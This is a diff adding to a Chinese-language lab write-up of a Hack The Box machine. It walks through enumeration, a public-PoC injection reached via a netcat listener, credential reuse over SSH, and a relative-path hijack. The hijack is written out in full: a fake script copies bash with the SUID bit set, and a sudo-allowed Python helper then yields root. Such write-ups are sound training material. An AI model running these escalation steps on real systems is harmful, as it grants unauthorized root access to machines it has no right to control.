@@ -51,22 +51,113 @@ sudo nmap --script=vuln -p22,80 10.129.228.217
 
 使用gobuster爆破目錄
 ```bash
-
+sudo gobuster dir -u http://searcher.htb -w /usr/share/dirbuster/wordlist/directory-2.3-medium.txt
 ```
+<img width="1113" height="333" alt="螢幕擷取畫面 2026-02-14 205045" src="https://github.com/user-attachments/assets/36f1e2f3-f175-4c88-8677-7a9653d8df5f" />
 
+探索各模組是否有公開漏洞
 
+<img width="503" height="101" alt="螢幕擷取畫面 2026-02-14 203046" src="https://github.com/user-attachments/assets/c832703a-d329-4641-9507-198c44bc22bb" />
+<img width="515" height="95" alt="螢幕擷取畫面 2026-02-14 203117" src="https://github.com/user-attachments/assets/4c63e715-1e00-4c79-95d3-93f23a745df1" />
+<img width="1315" height="678" alt="螢幕擷取畫面 2026-02-14 203743" src="https://github.com/user-attachments/assets/904f4937-845d-4a6b-9e34-d8d4b89ff268" />
 
+找到漏洞PoC
+
+<img width="1792" height="808" alt="螢幕擷取畫面 2026-02-14 211623" src="https://github.com/user-attachments/assets/aaacf11f-d799-4b1d-b383-b48c79837865" />
 
 ### 2.3 初始存取(Initial Access)
+
+使用Burp Suite抓取請求
+
+<img width="961" height="446" alt="螢幕擷取畫面 2026-02-14 211557" src="https://github.com/user-attachments/assets/38091da6-d701-496d-a208-0ae25de0f85f" />
+
+開啟nc監聽
+
+<img width="385" height="73" alt="螢幕擷取畫面 2026-02-14 211713" src="https://github.com/user-attachments/assets/840df856-99d2-4379-9b42-0f9350b552ab" />
+
+將Payload注入
+(注意，Payload需經過URL編碼)
+
+<img width="1189" height="409" alt="螢幕擷取畫面 2026-02-14 214356" src="https://github.com/user-attachments/assets/cac09014-eff8-4641-9598-2e1c0cb7e805" />
+
+獲得系統權限
+
+<img width="851" height="165" alt="螢幕擷取畫面 2026-02-14 214425" src="https://github.com/user-attachments/assets/42957cf7-e4e9-45d1-bc08-07b253840ae1" />
+<img width="544" height="195" alt="螢幕擷取畫面 2026-02-14 214726" src="https://github.com/user-attachments/assets/4abf2e03-8786-4964-9c60-f293c901aa4b" />
+
+
 ### 2.4 橫向移動(Lateral Movement)
+
+嘗試提權時發現必須有使用者密碼
+
+<img width="643" height="305" alt="螢幕擷取畫面 2026-02-14 215250" src="https://github.com/user-attachments/assets/20a26267-6a0f-4b44-be3c-474c336b8aeb" />
+
+經過內部探索後找到一組憑證
+
+<img width="971" height="797" alt="螢幕擷取畫面 2026-02-14 215458" src="https://github.com/user-attachments/assets/d53e8333-cb0b-4300-b333-d1cd0b496f5b" />
+
+經過手動碰撞，得知憑證為原使用者之密碼，可登入SSH
+
+<img width="738" height="390" alt="螢幕擷取畫面 2026-02-14 215628" src="https://github.com/user-attachments/assets/840bb14d-3c04-4e23-bad1-d96e9cf74149" />
+
 ### 2.5 權限提升(Privilege Escalation)
+
+枚舉sudo權限
+
+<img width="1470" height="187" alt="螢幕擷取畫面 2026-02-14 215713" src="https://github.com/user-attachments/assets/754b88d3-97b1-4bb8-ba70-a0e68846b716" />
+
+嘗試利用sudo權限
+
+<img width="1463" height="251" alt="螢幕擷取畫面 2026-02-14 220720" src="https://github.com/user-attachments/assets/de119cb4-7a97-4e00-95f9-e456a6f8176b" />
+
+嘗試竄改腳本，但並未擁有讀寫權限
+
+<img width="982" height="265" alt="螢幕擷取畫面 2026-02-14 222700" src="https://github.com/user-attachments/assets/2d3c7ec3-c447-471c-a648-975aadd8ac52" />
+
+在tmp目錄下創造同名假腳本，並寫入提權方案，成功提權
+
+```bash
+cd /tmp
+nano full-checkup
+```
+文件內容:
+```bash
+#! /bin/bash
+cp /bin/bash /tmp/bash
+chmod +s /tmp/bash
+```
+利用:
+```bash
+chmod +x full-checkup.sh
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+/tmp/bash -p
+```
+
+<img width="948" height="528" alt="螢幕擷取畫面 2026-02-14 224738" src="https://github.com/user-attachments/assets/f9e02318-6d37-4768-805a-1b35005c6061" />
+
 ### 2.6 最終成果(Impact)
+
+獲得root.txt
+
+<img width="1193" height="247" alt="螢幕擷取畫面 2026-02-14 224957" src="https://github.com/user-attachments/assets/850a2eee-b3c1-483c-a93c-53b71e8d7ba9" />
 
 ---
 
 ## 3. 學習回顧 (Lessons Learned)
 
 ### 成功的部分：
+
+攻擊鏈清晰，並未有相對複雜的邏輯，或高深技術，適合新手。
+
 ### 浪費時間的部分：
+
+searchsploit並未搜尋到有用結果，最後還是依賴Google才得以解決。
+
 ### 新知識點：
+
+路徑劫持是很常見的提權方式，也可在本機製作好提權腳本後利用wget上傳，直接執行。
+
 ### 與實戰對應：
+
+因公開漏洞是掛在在2.4.2，直接搜2.4.0可能需要找一下，考驗搜尋技巧。
+
